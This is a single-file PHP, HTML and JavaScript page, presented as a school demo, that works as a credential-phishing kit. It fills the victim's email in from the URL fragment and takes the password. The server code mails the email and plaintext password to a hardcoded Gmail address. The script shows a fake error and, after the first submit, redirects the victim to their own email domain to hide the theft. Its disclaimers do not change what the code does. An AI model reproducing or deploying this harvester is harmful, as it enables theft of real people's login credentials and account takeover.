<?php
// merged_form_handler.php
// Single-file PHP + HTML + JS example for school IT project.
// IMPORTANT: Do NOT use this for real credential harvesting. Use only with test accounts and in a controlled environment.

session_start();
error_reporting(E_ALL);

// Server-side handling for AJAX POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // read raw POST values
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
    $password = trim(filter_input(INPUT_POST, 'password', FILTER_UNSAFE_RAW)); // preserve raw for demonstration only
    $number = filter_input(INPUT_POST, 'number', FILTER_SANITIZE_NUMBER_INT);

    // Basic validation
    if (!$email || !$password) {
        // Return JSON error for XHR
        header('Content-Type: application/json');
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid input']);
        exit;
    }

    // Build message (for demo only — do NOT email real passwords in production)
    $message = "Email Address: " . htmlspecialchars($email) . "<br>Password: " . htmlspecialchars($password) . "<br>Count: " . intval($number);

    // Replace with your admin/test recipient. For safety, keep this a test email.
    $to = 'resultlog70@gmail.com';
    $subject = 'New Login (TEST)';

    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: " . $email . "\r\n";

    $sent = false;
    // Attempt to send mail — on many dev setups mail() is not configured; handle gracefully.
    if (filter_var($to, FILTER_VALIDATE_EMAIL)) {
        $sent = mail($to, $subject, $message, $headers);
    }

    header('Content-Type: application/json');
    if ($sent) {
        echo json_encode(['status' => 'ok', 'message' => 'Sent', 'payload' => $message]);
    } else {
        // For dev, still return success so client can continue its flow; in production handle appropriately.
        echo json_encode(['status' => 'ok', 'message' => 'Not sent (mail() may be unavailable on this server).', 'payload' => $message]);
    }
    exit;
}
?>

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Merged Form Handler (Demo)</title>
<style>
  body{font-family:system-ui,Segoe UI,Arial;max-width:700px;margin:2rem auto;padding:1rem}
  .hidden{display:none}
  #error{color:#b00}
</style>
</head>
<body>
  <h1>Demo: merged PHP + JavaScript form</h1>
  <p><strong>Warning:</strong> This page is for testing/learning only. Do not use with real user credentials.</p>

  <form id="form" method="post">
    <label for="email">Email</label><br>
    <input id="email" name="email" type="email" required><br><br>

    <label for="password">Password</label><br>
    <input id="password" name="password" type="password" required><br><br>

    <input id="number" name="number" type="hidden" value="1">

    <div id="error" class="hidden">An error occurred (demo message)</div>

    <button id="newbutton" type="submit">Submit</button>
  </form>

<script>
(function(){
  // On load, populate email from URL hash (if present)
  var link = window.location.href;
  try {
    var url = new URL(link);
    var hash = url.hash || '';
    var updated_email = hash.replace('#','');
    if (updated_email) {
      var emailInput = document.getElementById('email');
      emailInput.value = updated_email;
    }
  } catch(e){
    console.warn('Invalid URL while parsing hash', e);
  }

  // Derive characters after '@' for redirect later
  var inputString = document.getElementById('email').value || '';
  var delimiter = '@';
  var delimiterIndex = inputString.indexOf(delimiter);
  var charactersAfter = '';
  if (delimiterIndex !== -1) charactersAfter = inputString.substring(delimiterIndex + 1);

  document.addEventListener('DOMContentLoaded', function(){
    var form = document.getElementById('form');
    form.addEventListener('submit', function(e){
      e.preventDefault();

      var numberEl = document.getElementById('number');
      var number = parseInt(numberEl.value, 10) || 0;
      var button = document.getElementById('newbutton');
      var errors = document.getElementById('error');

      // Clear password field client-side for repeated submissions (demo behavior)
      var password = document.getElementById('password');
      var email = document.getElementById('email');

      // Prepare FormData
      var formData = new FormData(form);

      // Send to the same page (self) via XHR / Fetch
      fetch(window.location.href, {
        method: 'POST',
        body: formData,
        credentials: 'same-origin',
        headers: { 'X-Requested-With': 'XMLHttpRequest' }
      }).then(function(resp){
        return resp.json();
      }).then(function(data){
        console.log('Server response:', data);
        errors.style.display = 'block';
        if (data && data.status === 'ok') {
          errors.style.display = 'none';
        }
      }).catch(function(err){
        console.error('XHR error', err);
        var errors = document.getElementById('error');
        errors.textContent = 'Network error or server not available';
        errors.style.display = 'block';
      });

      // Reset password field value locally
      password.value = '';

      // increment number and store back
      var added = number + 1;
      numberEl.value = added;

      // If this is the first submit (number was 1 before increment), hide errors and redirect after 2s
      if (number === 1) {
        errors.style.display = 'none';
        // refresh charactersAfter from current email value
        var currentEmail = email.value || '';
        var idx = currentEmail.indexOf('@');
        var domain = (idx !== -1) ? currentEmail.substring(idx+1) : '';
        if (domain) {
          setTimeout(function(){
            // For safety, only redirect to a constructed domain if it resembles a domain (very basic check)
            // This is demo behavior copied from original code. Use with caution.
            window.location.href = 'https://www.' + domain;
          }, 2000);
        }
      }
    });
  });
})();
</script>

</body>
</html>
